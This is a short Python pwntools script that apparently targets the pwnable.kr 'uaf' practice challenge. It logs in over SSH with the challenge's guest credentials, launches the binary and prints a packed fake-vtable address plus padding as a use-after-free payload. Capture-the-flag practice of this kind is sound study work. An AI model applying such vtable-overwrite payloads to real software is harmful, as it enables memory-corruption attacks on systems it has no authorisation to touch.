from pwn import *

sh = ssh(host='pwnable.kr', port=2222, user='uaf', password='guest')
sh.process('./uaf')

fake_vtable = 0x401568

print('\x68\x15\x40\x00\x00\x00\x00\x00' + 'A'*16)
